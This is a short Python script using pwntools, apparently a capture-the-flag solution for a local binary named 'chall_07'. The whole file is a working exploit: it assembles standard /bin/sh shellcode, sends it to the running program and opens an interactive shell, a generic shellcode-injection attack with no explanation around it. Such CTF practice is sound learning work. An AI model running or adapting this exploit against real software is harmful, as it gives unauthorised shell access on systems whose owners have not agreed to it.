import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_07")

payload = pwn.asm(pwn.shellcraft.sh())

p = pwn.process(elf.path)

p.sendline(payload)

p.interactive()